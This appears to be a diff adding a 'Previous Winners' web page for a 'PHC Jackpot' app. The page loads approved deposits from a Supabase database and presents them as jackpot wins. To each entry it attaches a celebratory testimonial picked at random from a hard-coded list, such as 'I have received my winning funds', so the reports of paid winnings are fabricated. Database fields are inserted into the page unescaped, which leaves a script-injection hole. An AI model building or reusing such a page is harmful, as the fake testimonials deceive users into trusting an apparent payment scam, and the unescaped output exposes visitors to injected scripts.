@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Previous Winners</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        .chat-list {
+            padding: 0 20px 90px;
+        }
+        
+        .winner-message {
+            display: flex;
+            gap: 14px;
+            background: white;
+            padding: 16px;
+            border-radius: 20px;
+            margin-bottom: 14px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.04);
+            border: 1px solid rgba(0,0,0,0.02);
+            transition: 0.2s;
+        }
+        
+        .winner-message:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        }
+        
+        .winner-message .avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: #f5b342;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+        
+        .winner-message .message {
+            flex: 1;
+        }
+        
+        .winner-message .message b {
+            display: block;
+            font-size: 16px;
+            color: #0a1a2a;
+            margin-bottom: 3px;
+        }
+        
+        .winner-message .message p {
+            font-size: 14px;
+            color: #2a4a6a;
+            margin: 4px 0 8px;
+            line-height: 1.5;
+        }
+        
+        .winner-message .message span {
+            font-size: 12px;
+            color: #7a8a9a;
+            display: block;
+            background: #f0f4f8;
+            padding: 4px 12px;
+            border-radius: 30px;
+            display: inline-block;
+            font-weight: 600;
+        }
+        
+        .message-empty {
+            text-align: center;
+            color: #7a8a9a;
+            padding: 40px 20px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.04);
+        }
+        
+        .message-empty i {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 12px;
+            color: #d4dce5;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="app">
+
+        <div class="topbar">
+            <div class="logo">
+                PHC Winners
+            </div>
+            <i class="fas fa-trophy"></i>
+        </div>
+
+        <div class="welcome">
+            <h1>Previous Winners 🎉</h1>
+            <p>See recent jackpot celebrations</p>
+        </div>
+
+        <div class="chat-list" id="winnersList">
+            <div style="text-align:center; padding:30px; color:#7a8a9a;">
+                <i class="fas fa-spinner fa-spin" style="font-size:24px;"></i><br>
+                Loading winners...
+            </div>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-item" onclick="location.href='index.html'">
+                <i class="fas fa-home"></i> Home
+            </div>
+            <div class="nav-item active">
+                <i class="fas fa-trophy"></i> Jackpot
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-gear"></i> Settings
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ==========================================================
+        // GLOBAL DARK MODE LOADER
+        // ==========================================================
+        (function() {
+            if (localStorage.getItem("phc_dark_mode") === "true") {
+                document.body.classList.add("dark");
+            }
+        })();
+
+        // ==========================================================
+        // SUPABASE CONFIG
+        // ==========================================================
+        const SUPABASE_URL = "https://gcesrhfyupmkrevaqpfr.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdjZXNyaGZ5dXBta3JldmFxcGZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MjQ0MjAsImV4cCI6MjA5ODQwMDQyMH0.LarBYjP0Eg4HfFV_x5GVS7K1d4AuRfBWOjo0D1kL2xM";
+
+        // ==========================================================
+        // FETCH REAL WINNERS FROM SUPABASE
+        // ==========================================================
+        async function fetchWinners() {
+            // Fetch all approved deposits (real winners!)
+            const response = await fetch(`${SUPABASE_URL}/rest/v1/deposits?status=eq.approved&order=created_at.desc&limit=20`, {
+                headers: {
+                    'apikey': SUPABASE_ANON_KEY,
+                    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                }
+            });
+
+            if (!response.ok) {
+                document.getElementById('winnersList').innerHTML = `
+                    <div class="message-empty">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <h3>Could not load winners</h3>
+                        <p>Please try again later.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            const winners = await response.json();
+            const container = document.getElementById('winnersList');
+
+            if (winners.length === 0) {
+                container.innerHTML = `
+                    <div class="message-empty">
+                        <i class="fas fa-trophy"></i>
+                        <h3>No winners yet</h3>
+                        <p>Be the first to win the jackpot!</p>
+                    </div>
+                `;
+                return;
+            }
+
+            container.innerHTML = '';
+            
+            winners.forEach(winner => {
+                // Get initials
+                const name = winner.user_name || 'Anonymous Winner';
+                const initials = name.split(' ').map(n => n.charAt(0).toUpperCase()).join('').slice(0, 2);
+                
+                // Generate a celebratory message
+                const messages = [
+                    "🎉 Congratulations! I have received my winning funds 💰",
+                    "🎊 Amazing! My reward has arrived. Thank you PHC Jackpot 🍾",
+                    "🥳 I can't believe it! I received my jackpot payment 🎈",
+                    "🎉 Finally! My winning funds have been received 💵",
+                    "🍾 Big celebration today! PHC Jackpot paid my reward 🎊"
+                ];
+                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+
+                container.innerHTML += `
+                    <div class="winner-message">
+                        <div class="avatar">${initials}</div>
+                        <div class="message">
+                            <b>${name}</b>
+                            <p>${randomMsg}</p>
+                            <span>${winner.card_type || 'Jackpot'} • $${formatCurrency(winner.amount || 0)}</span>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        // ==========================================================
+        // CURRENCY FORMATTER
+        // ==========================================================
+        function formatCurrency(val) {
+            return val.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+        }
+
+        // ==========================================================
+        // INIT
+        // ==========================================================
+        document.addEventListener('DOMContentLoaded', fetchWinners);
+
+        console.log('🏆 PHC Winners page loaded with real data!');
+    </script>
+
+</body>
+</html>
